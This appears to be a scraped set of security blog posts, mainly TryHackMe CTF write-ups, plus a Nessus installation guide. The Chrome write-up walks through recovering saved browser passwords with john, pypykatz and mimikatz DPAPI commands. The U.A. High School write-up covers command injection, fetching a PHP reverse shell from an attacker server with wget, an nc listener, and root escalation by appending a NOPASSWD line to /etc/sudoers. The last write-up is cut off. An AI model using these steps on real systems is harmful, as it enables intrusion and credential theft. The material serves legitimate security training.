transfer.exe. Here we need to reverse .exe file, using git/icsharpcode/ilspy-vscode reference \u0026ndash;\u0026gt;HackTricks:ReversingTools:ILSpy \u0026ndash;\u0026gt; ILSpy Extension .\nILSpy Extension VSCode Installing/updating latest version of VSCode and installing ILSpy Extension VSCode extension.\nDecompiling transfer.exe Right click on exe file and select Decompile Selected assembly to decompile the file.\nDecompiled output From the above image we knows the function of tranfer.exe file:\nReads the data from C:\\Users\\hadri\\Downloads\\files.zip and encrypt as C:\\Users\\hadri\\Downloads\\encrypted_files. Encryption algorithm used is AES. Key: PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1 IV (Initialization Vector): lR3soZqkaWZ9ojTX Decrypting AES Lets decrypt the encrypted file.\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import sys # Replace these with your actual decryption key and initialization vector (IV) key = b\u0026#34;PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1\u0026#34; # 16-byte key (128-bit) iv = b\u0026#34;lR3soZqkaWZ9ojTX\u0026#34; # 16-byte IV def decrypt_file(encrypted_file_path, decrypted_file_path): \u0026#34;\u0026#34;\u0026#34;Decrypts a file using AES-128 in CBC mode with PKCS#7 padding. Args: encrypted_file_path (str): Path to the encrypted file. decrypted_file_path (str): Path to save the decrypted file. \u0026#34;\u0026#34;\u0026#34; with open(encrypted_file_path, \u0026#39;rb\u0026#39;) as encrypted_file: ciphertext = encrypted_file.read() cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) with open(decrypted_file_path, \u0026#39;wb\u0026#39;) as decrypted_file: decrypted_file.write(plaintext) # Example usage (replace paths accordingly) encrypted_file_path = sys.argv[1] decrypted_file_path = sys.argv[2] decrypt_file(encrypted_file_path, decrypted_file_path) print(\u0026#34;File decrypted successfully!\u0026#34;) I fed the transfer.exe contents, containing an encryption mechanism, to an AI tool, and it produced the necessary decryption script. Save the above python script as decryption.py.\npip3 install pycryptodome # to use Crypto in Python env python3 decryption.py encrypted_files decrypted_file.zip unzip decrypted_file.zip -d decrypted_files Now we got the decrypted contents of the file encrypted_files. Let\u0026rsquo;s go through the files.\nAppData [Windows] We have the AppData file of Windows OS, which is a hidden system folder that stores application data and settings specific to the user profile. It is used by Windows and installed applications to store user-specific information such as configuration files, temporary files, saved sessions, caches, and other necessary data.\nGoogle Search: Chrome Passwords AppData We got a interesting file result in simple google search. Lets analyze that.\nSolving using Linux $ file decrypted_files/AppData/Local/Google/Chrome/User\\ Data/Default/Login\\ Data decrypted_files/AppData/Local/Google/Chrome/User Data/Default/Login Data: SQLite 3.x database, last written using SQLite version 3039004, page size 2048, file counter 1, database pages 23, cookie 0xd, schema 4, UTF-8, version-valid-for 1 Found an interesting database file.\nAppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 AppData/Local/Google/Chrome/User\\ Data/Default/Login\\ Data AppData/Local/Google/Chrome/User\\ Data/Local\\ State After further enumaration found some other important files.\nDB Browser for SQLite DB Browser for SQLite Using pre installed DB Browser for SQLite in Kali Linux, We found an Database Structure and interesting table logins using the file Login Data.\nTable: Logins We got the important data like usernames, passwords and website urls from the database. But here the password field contains the binary data which is unreadable.\nHere we got flag2 and flag4.\nDPAPImk2john We can use DPAPImk2john to crack the users password to proceed further.\npip install pycryptodome # installing dependency for DPAPImk2john $ DPAPImk2john -h usage: DPAPImk2john [-h] [-S SID] [-mk MASTERKEY] [-d] [-c {domain,domain1607+,domain1607-,local}] [-P PREFERRED] [--password PASSWORD] options: -h, --help show this help message and exit -S SID, --sid SID SID of account owning the masterkey file. -mk MASTERKEY, --masterkey MASTERKEY masterkey file (usually in %APPDATA%\\Protect\\\u0026lt;SID\u0026gt;). -d, --debug -c {domain,domain1607+,domain1607-,local}, --context {domain,domain1607+,domain1607-,local} context of user account. 1607 refers to Windows 10 1607 update. -P PREFERRED, --preferred PREFERRED \u0026#39;Preferred\u0026#39; file containing GUID of masterkey file in use (usually in %APPDATA%\\Protect\\\u0026lt;SID\u0026gt;). Cannot be used with any other command. --password PASSWORD password to decrypt masterkey file. DPAPImk2john Tool Usage.\n$ DPAPImk2john -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c \u0026#34;local\u0026#34; $DPAPImk$2*1*S-1-5-21-3854677062-280096443-3674533662-1001*aes256*sha512*8000*46bc22dbffb7cfe4cfc5895acf364a94*288*a332e98ce791b7416157137e7193596d4594dc599acc321f6ed9e94a818879461639b958099ab61361c7fd4d6668ca2d8995488ffba78758b945dcbfc60498c84b14c8021fbee8d90cf4165637222c8a6cd1eb3c5a85acf85177b1ec86240c7e077eb5e427e27832f3481664baf54c06cb3bb47bcfc253620958f02f69bc98ece8e51b6ef3c498047efb4a2b57bf804b $ $ DPAPImk2john -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c \u0026#34;local\u0026#34; \u0026gt; ../DPAPIdecryption.txt Generating the hash to decrypt using DPAPImk2john.\n$ john ../DPAPIdecryption.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) [password-redacted] (?) Session completed. Cracking the passsword of the user using John the Ripper tool.\nHere we got the flag 1.\npypykatz Here we found a tool called pypykatz , used to crack the chrome passwords.\nProcess of decrypting DPAPI secrets This diagram shows how to get the secrets(passwords). AS YOU CAN SEE to get secrets you will need multiple things, just waving one file an expecting things to magically decrypt themselves will not work.\n$ pypykatz dpapi chrome -h usage: pypykatz dpapi chrome [-h] [--logindata LOGINDATA] [--cookies COOKIES] mkf localstate $ $ pypykatz dpapi masterkey -h usage: pypykatz dpapi masterkey [-h] [-o OUT_FILE] masterkeyfile prekey $ $ pypykatz dpapi prekey password test_password usage: pypykatz password [-h] [-o OUT_FILE] sid password Use these commands for known the tool usage.\n$ pypykatz dpapi prekey password S-1-5-21-3854677062-280096443-3674533662-1001 [password-redacted] 31a620ca577e6ad02ae701673bee51d32aa5538b 16f809ed93fff267679b64095ec2ed54f20da076 266c0db66dda55bcf2a3bf948c9176f9d0073f30 $ pypykatz dpapi masterkey -o mk1.txt 8c6b6187-8eaa-48bd-be16-98212a441580 31a620ca577e6ad02ae701673bee51d32aa5538b $ pypykatz dpapi chrome --logindata Login\\ Data mk1.txt Local\\ State file: Login Data user: Administrator pass: b\u0026#39;[redacted-Password]\u0026#39; url: file: Login Data user: chrome pass: b\u0026#39;[redacted-Password]\u0026#39; url: We got the passwords here (Flag 3 and Flag 5).\nSolving using Windows DPAPImk2john.py PS Z:\\\u0026gt; pip install --user pycryptodome PS Z:\\\u0026gt; notepad DPAPImk2john.py Installing dependency for DPAPImk2john.py and copy pasting the .py file using notepad. Tool: JohnTheRipper , latest version for Windowsx64 .\nPS Z:\\\u0026gt; python .\\DPAPImk2john.py -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk \u0026#34;Z:\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3854677062-280096443-3674533662-1001\\8c6b6187-8eaa-48bd-be16-98212a441580\u0026#34; -c \u0026#34;local\u0026#34; \u0026gt; hash.txt PS Z:\\\u0026gt; john-1.9.0-jumbo-1-win64\\run\\john.exe hash.txt --wordlist=rockyou.txt Error: UTF-16 BOM seen in input file. Running john.exe to crack the password, we got the error.\nPS Z:\\\u0026gt; $InputFile = \u0026#34;hash.txt\u0026#34; ; $OutputFile = \u0026#34;hash_utf8.txt\u0026#34;; $Text = Get-Content -Path $InputFile -Raw; $Text | Out-File -FilePath $OutputFile -Encoding utf8 Converting the data from UTF-16 to UTF-8 format to solve the error and saving it in hash_utf8.txt.\nPS Z:\\\u0026gt; john-1.9.0-jumbo-1-win64\\run\\john.exe .\\hash_utf8.txt --wordlist=rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) Cost 1 (iteration count) is 8000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [password-redacted] (?) 1g 0:00:00:00 DONE (2024-09-09 06:40) 4.807g/s 307.6p/s 307.6c/s 307.6C/s 123456..charlie Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Successfully cracked the user password.\nmimikatz PS Z:\\\u0026gt; Z:\\mimikatz\\x64\\mimikatz.exe # starting mimi .#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ Lets use Mimikatz .\nMASTERKEY mimikatz # dpapi::masterkey /in:\u0026#34;Z:\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3854677062-280096443-3674533662-1001\\8c6b6187-8eaa-48bd-be16-98212a441580\u0026#34; /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password:[password redacted] /protected **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {8c6b6187-8eaa-48bd-be16-98212a441580} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 46bc22dbffb7cfe4cfc5895acf364a94 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : a332e98ce791b7416157137e7193596d4594dc599acc321f6ed9e94a818879461639b958099ab61361c7fd4d6668ca2d8995488ffba78758b945dcbfc60498c84b14c8021fbee8d90cf4165637222c8a6cd1eb3c5a85acf85177b1ec86240c7e077eb5e427e27832f3481664baf54c06cb3bb47bcfc253620958f02f69bc98ece8e51b6ef3c498047efb4a2b57bf804b [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 16b1972d3eb971ab727d3ad4e392c1ca rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : bc71f554919b4d147bf51f53950fa13278979eef7398d84ecf500988864dc52eecbe9a0201a74dbb62f38e3b7957e5aa67297c29292cba05a46007bc04f1237304ee4b064442356be165ea54e0ed2664adeb1abbeb98bfe0f5b714f00d50da8d0e9271908b036dcb2aff44f2724f41bd [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {ba7fc17c-8195-4272-afae-c9fc71e42540} [masterkey] with volatile cache: SID:S-1-5-21-3854677062-280096443-3674533662-1001;GUID:{ba7fc17c-8195-4272-afae-c9fc71e42540};MD4:753621b31cbdb532e69fcb2e64924cfe;SHA1:f6f173c285829fccc958584ac81ae15a572fd69c; key : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 sha1: 217522c457cfe8a95da45da81d6b898080e2067d [masterkey] with password: [password redacted] (protected user) key : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 sha1: 217522c457cfe8a95da45da81d6b898080e2067d Here we got the Master Key. We need encrypted key to proceed further, which we found in AppData/Local/Google/Chrome/User Data/Local State.\nEncrypted Key Cyberchef: encrypted_key Here we got the encrypted key, we can use it.\nmimikatz # dpapi::chrome /in:\u0026#34;Z:\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u0026#34; /masterkey:\u0026#34;ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840\u0026#34; /encryptedKey:RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACHYWuMqo69SL4WmCEqRBWAAAAAAAIAAAAAABBmAAAAAQAAIAAAAHPuV6P/8jN+rng8E61Z0xxi2hUf4Q4oxa5gFqSnctqdAAAAAA6AAAAAAgAAIAAAAAEF9lst8zMKmCFJ3WmD46TZY/xJF+s5Xf9mTQ2wa16ZMAAAABFU2C2V+l6K3y7ROKkA0cIaWyuXB9i7zUwBBu6mt7vM2QGZtqmjhcX6ZSWrX8JUwkAAAADgBkMLAP19Rtax5T8aKAESgwV+ABz65DOgEGwwSkkQMbWrwz7p42SzpfJUj7jcyUSTOblLRNtB8YTwhm3wCQSi \u0026gt; Encrypted Key seems to be protected by DPAPI * volatile cache: GUID:{8c6b6187-8eaa-48bd-be16-98212a441580};KeyHash:217522c457cfe8a95da45da81d6b898080e2067d;Key:available * masterkey : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 \u0026gt; AES Key is: 9a3094f1bfe3e19d5d039fb569d35d49ad083ac34dbcd5d9e42a506b8d4a192c URL : https://[url redacted]/ ( https://[url redacted]/ ) Username: Administrator * using BCrypt with AES-256-GCM Password: [password redacted] URL : https://[url redacted]/ ( https://[url redacted]/ ) Username: chrome * using BCrypt with AES-256-GCM Password: [password redacted] We solved the lab.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/chrome/writeup/","tags":["Wireshark","ILSpy","AppData[Windows]","DPAPImk2john","john","pypykatz","mimikatz"],"title":"Chrome | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for U.A. High School CTF challenges on TryHackMe .\nSummary This CTF challenge required participants to identify and exploit a hidden OS command injection vulnerability in the U.A. Superhero Academy\u0026rsquo;s website. Successful exploitation led to gaining root privileges on the system.\nVulnerability The website contains a hidden functionality that allows for the execution of shell commands. This vulnerability can be exploited to gain unauthorized access to the system.\nExploitation By enumerating the website, a valid user and password were discovered. Using sudo privileges, a script was executed on the system to escalate privileges to root level. Tools Used rustscan, ffuf, curl, nc, wget, hexeditor, steghide, ssh\nEnumaration echo \u0026#34;10.10.72.235 uahschool.com\u0026#34;\u0026gt;\u0026gt; /etc/hosts Lets start with mapping the target ip with uahschool.com.\n$ rustscan -a uahschool.com -- -sC -sV Open 10.10.72.235:22 Open 10.10.72.235:80 [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.72.235 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4WNbSymq7vKwxstoKDOXzTzNHnE4ut9BJPBlIb44tFvtMpfpXDF7Bq7MT9q4CWASVfZTw763S0OrtvpBFPpN/4eOvlircakFfkR3hZk7dHOXe8+cHXDth90XnMa2rq5CfxwinqP/Mo67XcpagbpU9O5lCatTMPWBUcEhIOXY8aUSMkmN6wRYSxdI40a4IYsjRqkqsdA6yaDQBSx+ryFRXwS9+kpUskAv452JKi1u2H5UGVX862GC1xAYHapKY24Yl6l5rTToGqTkobHVCv6t9dyaxkGtc/Skoi2mkWE/GM0SuqtbJ9A1qhSrfQRNpcIJ6UaVhDdUeO3qPX2uXPyLrY+i+1EgYEsRsxD5ym0bT1LPby8ONPduBEmZfnNoN5IBR05rQSSHhj349oNzDC4MRn2ygzOyx0n0c7wqffaAuohbu0cpeAcl5Nwb/Xw42RABDFQx08CttjNmtPMK/PqFt+H4nubyp7P8Pwctwi3wLf2GbU1lNgT0Ewf2GnfxY5Bs= | 256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+IqWgEnT5Asc+8VrYsQACkIjP+2CKuoor+erbKjpKwM8+X+1TPuwG56O6LxOLXeS2/pFjv9PBFI1oqHKa4GNw= | 256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQa5m2TxGI3a9ZwhAd0zWsAYwCsYANdo6fgpS8XiJKL 80/tcp open http syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: U.A. High School |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Lets start with rustscan, we found 2 open ports - port 22(ssh) and port 80(webserver) and the operating system used is Linux. Lets start with webserver.\nuahschool.com Home Page OS Command Injection $ ffuf -c -u http://uahschool.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.jsp about.html [Status: 200, Size: 2542, Words: 276, Lines: 53, Duration: 167ms] admissions.html [Status: 200, Size: 2573, Words: 232, Lines: 64, Duration: 169ms] assets [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 146ms] # directory contact.html [Status: 200, Size: 2056, Words: 142, Lines: 72, Duration: 157ms] courses.html [Status: 200, Size: 2580, Words: 180, Lines: 88, Duration: 148ms] index.html [Status: 200, Size: 1988, Words: 171, Lines: 62, Duration: 160ms] $ ffuf -c -u http://uahschool.com/assets/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.jsp images [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 140ms] index.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 165ms] $ ffuf -c -u http://uahschool.com/assets/index.php?FUZZ=ls -w /usr/share/wordlists/dirb/big.txt -fs 0 cmd [Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 159ms] Our initial fuzz testing revealed various HTML files and a directory named \u0026ldquo;assets/\u0026rdquo;. Further exploration through fuzzing the \u0026ldquo;assets/\u0026rdquo; directory uncovered the presence of \u0026ldquo;index.php\u0026rdquo; and another directory named \u0026ldquo;images/\u0026rdquo;. Fuzzing the \u0026ldquo;images/\u0026rdquo; directory yielded no significant results. Interestingly, the URL http://uahschool.com/assets/index.php itself didn\u0026rsquo;t generate a response from the server.\nHowever, by fuzzing the query parameters for \u0026ldquo;index.php\u0026rdquo;, we discovered a parameter named \u0026ldquo;cmd\u0026rdquo;. This suggests that the script \u0026ldquo;index.php\u0026rdquo; might be able to execute commands through this parameter, as demonstrated by the example URL http://uahschool.com/assets/index.php?cmd=ls\n$ curl http://uahschool.com/assets/index.php?cmd=id dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK $ curl http://uahschool.com/assets/index.php?cmd=id | base64 -d uid=33(www-data) gid=33(www-data) groups=33(www-data) $ curl http://uahschool.com/assets/index.php?cmd=which+nc+python+python3 | base64 -d /usr/bin/nc /usr/bin/python3 $ curl http://uahschool.com/assets/index.php?cmd=pwd | base64 -d /var/www/html/assets The response we got using Command Injection is base64 encoded. From the above results we got that we are able to run commands as user www-data in /var/www/html/assets location. To get reverse shell we can use nc or python.\nExploitation Tried to got reverse shell using python3 and nc but it failed. Used pentestmonkey/php-reverse-shell for creating a php rev-shell payload.\npython -m http.server 8080 Started a Python http-server to transfer the payload in the location of payload directory.\n$ nc -nvlp 1234 listening on [any] 1234 ... Listening in port in 1234 for getting the reverse shell.\ncurl http://uahschool.com/assets/index.php?cmd=wget%20http://10.10.1.100:8080/php-reverse-shell.php curl http://uahschool.com/assets/php-reverse-shell.php Downloading php-reverse-shell.php and executing it gives us the reverse shell.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\n$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash deku:x:1000:1000:deku:/home/deku:/bin/bash During enumaration we found a valid user deku in the system.\nwww-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d AllmightForEver!!! During enumaration found an interesting file /var/www/Hidden_Content/passphrase.txt but its not the password for user deku.\noneforall.jpg Further enumaration we got a assets/images/oneforall.jpg file, but not able to open it in webserver. Lets download that and investigate further.\n$ wget http://uahschool.com/assets/images/oneforall.jpg $ file oneforall.jpg oneforall.jpg: data $ exiftool oneforall.jpg ExifTool Version Number : 12.76 File Name : oneforall.jpg Directory : . File Size : 98 kB File Modification Date/Time : 2023:07:09 22:12:05+05:30 File Access Date/Time : 2024:08:25 14:33:48+05:30 File Inode Change Date/Time : 2024:08:25 14:33:43+05:30 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Warning : PNG image did not start with IHDR There is data corruption in the image file. Here we can notice that extension is .jpg, but as per meta data image is of type PNG.\nHexeditor hexeditor oneforall.jpg # to edit the hex data of a file # (Ctrl X) to exit from hexeditor Using Wikipedia:List_of_file_signatures to get the hex values of all formats.\nHexEditor orginal data: oneforall.jpg We can see that the hex value of the file is in PNG format.\nHexEditor modified data: oneforall.jpg Now format of the file changed to jpg (JFIF), and now we can open the file.\noneforall.jpg StegHide $ steghide extract -sf oneforall.jpg -p \u0026#39;AllmightForEver!!!\u0026#39; wrote extracted data to \u0026#34;creds.txt\u0026#34;. $ cat creds.txt Hi Deku, this is the only way I\u0026#39;ve found to give you your account credentials, as soon as you have them, delete this file: deku:One?For?All_!!one1/A Finally we found the password for the user deku. Lets ssh deku.\ncat /home/deku/user.txt We got the user flag here.\nPrivilege Escalation deku@myheroacademia:~$ sudo -l [sudo] password for deku: Matching Defaults entries for deku on myheroacademia: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User deku may run the following commands on myheroacademia: (ALL) /opt/NewComponent/feedback.sh We can run /opt/NewComponent/feedback.sh as root user.\n#!/bin/bash echo \u0026#34;Hello, Welcome to the Report Form \u0026#34; echo \u0026#34;This is a way to report various problems\u0026#34; echo \u0026#34; Developed by \u0026#34; echo \u0026#34; The Technical Department of U.A.\u0026#34; echo \u0026#34;Enter your feedback:\u0026#34; read feedback if [[ \u0026#34;$feedback\u0026#34; != *\u0026#34;\\`\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;)\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\\$(\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;|\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\u0026amp;\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;;\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;?\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;!\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\\\\\u0026#34;* ]]; then echo \u0026#34;It is This:\u0026#34; eval \u0026#34;echo $feedback\u0026#34; echo \u0026#34;$feedback\u0026#34; \u0026gt;\u0026gt; /var/log/feedback.txt echo \u0026#34;Feedback successfully saved.\u0026#34; else echo \u0026#34;Invalid input. Please provide a valid input.\u0026#34; fi Bypassing Special Character check The above script is the contents of /opt/NewComponent/feedback.sh. Here user input is stored in the variable $feedback and filteration happens if it contains the following pattern [ \u0026ldquo;`\u0026rdquo;, \u0026ldquo;)\u0026rdquo;, \u0026ldquo;$(\u0026rdquo;, \u0026ldquo;|\u0026rdquo;, \u0026ldquo;\u0026amp;\u0026rdquo;, \u0026ldquo;;\u0026rdquo;, \u0026ldquo;?\u0026rdquo;, \u0026ldquo;!\u0026rdquo;, \u0026ldquo;\\\u0026rdquo; ]. Basically they are trying to restrict the user to run command as root user.\nLets look at the other special characters which we can use in linux shell[ \u0026ldquo;~\u0026rdquo;, \u0026ldquo;#\u0026rdquo;, \u0026ldquo;*\u0026rdquo;, \u0026ldquo;[\u0026rdquo;, \u0026ldquo;]\u0026rdquo;, \u0026ldquo;{\u0026rdquo;, \u0026ldquo;}\u0026rdquo;, \u0026ldquo;'\u0026rdquo;, \u0026ldquo;\u0026quot;\u0026rdquo;, \u0026ldquo;\u0026lt;\u0026rdquo;, \u0026ldquo;\u0026gt;\u0026rdquo;, \u0026ldquo;/\u0026rdquo; ].\nIn the above mentioned characters, \u0026ldquo;\u0026gt;\u0026rdquo;, is very useful to redirect the results.\ndeku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh Hello, Welcome to the Report Form This is a way to report various problems Developed by The Technical Department of U.A. Enter your feedback: Apple is good for Health. \u0026gt; /tmp/test.txt It is This: Feedback successfully saved. deku@myheroacademia:~$ ls -lah /tmp/test.txt -rw-r--r-- 1 root root 26 Aug 25 16:11 /tmp/test.txt deku@myheroacademia:~$ cat /tmp/test.txt Apple is good for Health. Here we tried to create a file as a root user whose content is Apple is good for Health. and it works. Lets use the same to get root privilege.\ndeku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh Hello, Welcome to the Report Form This is a way to report various problems Developed by The Technical Department of U.A. Enter your feedback: deku ALL=NOPASSWD: ALL \u0026gt;\u0026gt; /etc/sudoers It is This: Feedback successfully saved. deku@myheroacademia:~$ sudo -l Matching Defaults entries for deku on myheroacademia: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User deku may run the following commands on myheroacademia: (ALL) /opt/NewComponent/feedback.sh (root) NOPASSWD: ALL deku@myheroacademia:~$ sudo bash root@myheroacademia:/home/deku# id uid=0(root) gid=0(root) groups=0(root) We got sudo rights to run all commands by giving deku ALL=NOPASSWD: ALL \u0026gt;\u0026gt; /etc/sudoers as feedback.\ncat /root/root.txt Here we got the root flag.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/u.a.highschool/writeup/","tags":["Command Injection","HexEditor","StegHide","SpecialCharacterBypass"],"title":"U.A. High School | THM Writeup"},{"categories":["Tool"],"content":"Intro Nessus is a proprietary vulnerability scanner developed by Tenable, Inc. This blog is about the installation of Nessus Essentials on Linux.\nInstallation Register First lets register in Tenable Nessus Essentials to get the activation code.\nTenable Nessus Essentials Enter your information in the register form shown above, click Get Started.\nDownload Nessus Mail with Activation Code We should have received a mail with Activation Code. Note down the activation code and click the Download Nessus for the downloading page.\nTenable Nessus - Download Select the Platform and Nessus Version then, download the package using prefered method.\nNavigate to the downloaded directory.\ncd ~/Downloads # in case of Linux and downloaded file is in Downloads directory. Install the downloaded package.\nsudo dpkg -i Nessus-*.deb # in case of Debian Linux/Ubuntu Start Nessus Service Start the Nessus service.\n/bin/systemctl start nessusd.service The above command will start the Nessus service, which we can use at https://127.0.0.1:8834/ in browser. Open this URL in browser.\nFollow the process to get into the Nessus home page.\nInstall Offline Check the Register Offline button and click continue.\nSelect Nessus Essentials.\nWe need to have a Listence Key to continue. To get one, lets go with Offline Registration.\nWe need Challenge Code and activation code to move further. We got activation code in the mail received. Follow the below process to get Challenge code.\nChallenge Code sudo /opt/nessus/sbin/nessuscli fetch --challenge By running the above command, will get the challenge code.\nSubmit the challenge code and acivation code.\nNow we should get the Licence.\nCopy and paste the Licence Staring and click Continue.\nNessus Login Create the username and password. Note this for logging in the future.\nNessus Initilizing Nessus installed and initilized successfully.\nPlugin Install Inorder to use Nessus for scanning, plugins should be installed. Follow the above image to install basic nessus plugins. About --\u0026gt; Sowtware Update --\u0026gt; Update all components --\u0026gt; Save. Wait for some time to so that plugins will be installed. Status of plugin installation will be observed in notification section which is in top right of the screen.\nNessus Scan Use this option to start a new scan.\nSelect the requires scan type. I\u0026rsquo;m going with Web Application Scan to test a website.\nGive the required details with target ip or domain and save it.\nLaunch Nessus Scan Nessus Scan Status Nessus Scan Result ","permalink":"https://cyberjagadeesh.github.io/posts/nessus/writeup/","tags":["Nessus","Installation"],"title":"Nessus Installation Guide"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .\nTools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.249.133 airplane.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Rustscan Let\u0026rsquo;s start enumaration process using rustscan portscanner.\n$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] 